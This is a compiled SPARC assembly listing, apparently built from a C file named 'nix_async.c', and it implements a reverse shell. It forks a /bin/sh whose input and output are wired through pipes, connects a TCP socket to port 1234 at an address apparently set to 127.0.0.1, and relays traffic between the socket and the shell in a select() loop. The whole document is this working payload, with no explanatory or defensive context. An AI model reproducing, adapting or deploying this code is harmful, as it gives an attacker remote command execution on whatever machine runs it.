	.file	"nix_async.c"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC0:
	.asciz	"/bin/sh"
	.section	.text.startup,"ax",@progbits
	.align 4
	.global main
	.type	main, #function
	.proc	04
main:
	.register	%g2, #scratch
	.register	%g3, #scratch
	sethi	%hi(8192), %g1
	xor	%g1, -368, %g1
	save	%sp, %g1, %sp
	add	%fp, 2047, %g1
	add	%fp, 2047, %g2
	sethi	%hi(8192), %i5
	xor	%i5, -184, %i2
	add	%g1, %i2, %l0
	sethi	%hi(16777216), %g1
	or	%g1, 127, %g1
	sethi	%hi(_GLOBAL_OFFSET_TABLE_-4), %l7
	call	__sparc_get_pc_thunk.l7
	 add	%l7, %lo(_GLOBAL_OFFSET_TABLE_+4), %l7
	stx	%g1, [%g2+%i2]
	xor	%i5, -176, %i3
	add	%g2, %i3, %l1
	call	pipe, 0
	 mov	%l1, %o0
	add	%fp, 2047, %g1
	xor	%i5, -168, %i0
	add	%g1, %i0, %i4
	call	pipe, 0
	 mov	%i4, %o0
	call	fork, 0
	 nop
	cmp	%o0, 0
	bne,pt	%icc, .L2
	 mov	%o0, %i1
	add	%fp, 2047, %g2
	mov	0, %o1
	call	dup2, 0
	 ldsw	[%g2+%i3], %o0
	mov	1, %o1
	call	dup2, 0
	 ldsw	[%i4+4], %o0
	xor	%i5, -160, %i5
	mov	2, %o1
	call	dup2, 0
	 ldsw	[%i4+4], %o0
	add	%fp, 2047, %g3
	call	close, 0
	 ldsw	[%g3+%i3], %o0
	call	close, 0
	 ldsw	[%l1+4], %o0
	add	%fp, 2047, %g1
	call	close, 0
	 ldsw	[%g1+%i0], %o0
	call	close, 0
	 ldsw	[%i4+4], %o0
	add	%fp, 2047, %g2
	sethi	%gdop_hix22(.LC0), %o0
	add	%g2, %i5, %o1
	xor	%o0, %gdop_lox10(.LC0), %o0
	stx	%g0, [%o1+8]
	ldx	[%l7 + %o0], %o0, %gdop(.LC0)
	mov	0, %o2
	call	execve, 0
	 stx	%o0, [%g2+%i5]
	add	%fp, 2047, %g3
.L19:
	sethi	%hi(8192), %i5
	xor	%i5, -176, %g1
	add	%g3, %g1, %g1
	call	close, 0
	 ldsw	[%g1+4], %o0
	add	%fp, 2047, %g1
	xor	%i5, -168, %i5
	mov	0, %i0
	call	close, 0
	 ldsw	[%g1+%i5], %o0
	return	%i7+8
	 nop
.L2:
	add	%fp, 2047, %g1
	call	close, 0
	 ldsw	[%g1+%i3], %o0
	xor	%i5, -144, %i5
	call	close, 0
	 ldsw	[%i4+4], %o0
	mov	0, %o2
	mov	1, %o1
	call	socket, 0
	 mov	2, %o0
	mov	2, %g1
	add	%fp, 2047, %g2
	sth	%g1, [%g2+%i5]
	mov	1234, %g1
	add	%g2, %i5, %o1
	sth	%g1, [%o1+2]
	lduw	[%g2+%i2], %g1
	st	%g1, [%o1+4]
	lduw	[%l0+4], %g1
	mov	%o0, %i4
	st	%g1, [%o1+8]
	mov	%o0, %i0
	call	connect, 0
	 mov	16, %o2
	add	%i4, 63, %g1
	cmp	%i4, 0
	mov	%i4, %i3
	movl	%icc, %g1, %i3
	sethi	%hi(-2147483648), %g1
	or	%g1, 63, %g1
	andcc	%g1, %i4, %g1
	bge,pt	%icc, .L4
	 sra	%i3, 6, %i3
	add	%g1, -1, %g1
	or	%g1, -64, %g1
	add	%g1, 1, %g1
.L4:
	sethi	%hi(8192), %i5
	add	%fp, 2047, %g3
	mov	1, %l0
	xor	%i5, -128, %l5
	sra	%i3, 0, %i3
	xor	%i5, -176, %l1
	sllx	%l0, %g1, %l0
	add	%g3, %l5, %l5
	sllx	%i3, 3, %l4
	add	%g3, %l1, %l1
	sethi	%hi(-2147483648), %i2
.L18:
	sllx	%i3, 3, %l2
	xor	%i5, -168, %l3
	or	%i2, 63, %i2
	mov	0, %g1
.L23:
	stx	%g0, [%g1+%l5]
.L20:
	add	%g1, 8, %g1
	cmp	%g1, 128
	bne,a,pt %xcc, .L20
	 stx	%g0, [%g1+%l5]
	ldx	[%l5+%l2], %g1
	add	%fp, 2047, %g2
	or	%g1, %l0, %g1
	stx	%g1, [%l5+%l2]
	lduw	[%g2+%l3], %g1
	add	%g1, 63, %g2
	cmp	%g1, 0
	mov	%g1, %g3
	movl	%icc, %g2, %g3
	andcc	%g1, %i2, %g1
	mov	%g3, %g2
	mov	6, %g3
	sra	%g2, %g3, %g2
	bge,pt	%icc, .L6
	 sllx	%g2, 3, %g4
	add	%g1, -1, %g1
	or	%g1, -64, %g1
	add	%g1, 1, %g1
.L6:
	mov	1, %g3
	sllx	%g2, 3, %g2
	sllx	%g3, %g1, %g1
	ldx	[%l5+%g2], %g2
	or	%g1, %g2, %g1
	mov	0, %o4
	stx	%g1, [%l5+%g4]
	mov	0, %o3
	mov	0, %o2
	mov	%l5, %o1
	call	select, 0
	 mov	1024, %o0
	cmp	%o0, 0
	bl,pn	%icc, .L21
	 mov	20, %o1
	ldx	[%l5+%l4], %g1
	and	%l0, %g1, %g1
	brz,pt	%g1, .L22
	 add	%fp, 2047, %g2
	add	%fp, 2047, %g1
	mov	%i5, %o2
	sub	%g1, %i5, %l6
	sra	%i0, 0, %o0
	call	read, 0
	 mov	%l6, %o1
	cmp	%o0, 0
	ble,pn	%icc, .L7
	 sra	%o0, 0, %o2
	mov	%l6, %o1
	call	write, 0
	 ldsw	[%l1+4], %o0
	add	%fp, 2047, %g2
.L22:
	lduw	[%g2+%l3], %o0
	add	%o0, 63, %g1
	cmp	%o0, 0
	mov	%o0, %g3
	movl	%icc, %g1, %g3
	mov	6, %g1
	sra	%g3, %g1, %g3
	andcc	%o0, %i2, %g1
	bge,pt	%icc, .L10
	 sllx	%g3, 3, %g3
	add	%g1, -1, %g1
	or	%g1, -64, %g1
	add	%g1, 1, %g1
.L10:
	mov	1, %g2
	sllx	%g2, %g1, %g1
	ldx	[%l5+%g3], %g2
	and	%g1, %g2, %g1
	brz,pt	%g1, .L23
	 mov	0, %g1
	add	%fp, 2047, %g2
	mov	-1, %i2
	mov	%i5, %o2
	sllx	%i2, 13, %i2
	sra	%o0, 0, %o0
	add	%g2, %i2, %i2
	call	read, 0
	 mov	%i2, %o1
	cmp	%o0, 0
	ble,pn	%icc, .L7
	 sra	%o0, 0, %o2
	mov	%i2, %o1
	call	write, 0
	 sra	%i0, 0, %o0
	ba,pt	%xcc, .L18
	 sethi	%hi(-2147483648), %i2
.L7:
	mov	20, %o1
.L21:
	call	kill, 0
	 mov	%i1, %o0
	call	close, 0
	 mov	%i4, %o0
	ba,pt	%xcc, .L19
	 add	%fp, 2047, %g3
	.size	main, .-main
	.ident	"GCC: (Debian 6.3.0-19) 6.3.0 20170618"
	.section	.text.__sparc_get_pc_thunk.l7,"axG",@progbits,__sparc_get_pc_thunk.l7,comdat
	.align 4
	.weak	__sparc_get_pc_thunk.l7
	.hidden	__sparc_get_pc_thunk.l7
	.type	__sparc_get_pc_thunk.l7, #function
	.proc	020
__sparc_get_pc_thunk.l7:
	jmp	%o7+8
	 add	%o7, %l7, %l7
	.section	.note.GNU-stack,"",@progbits
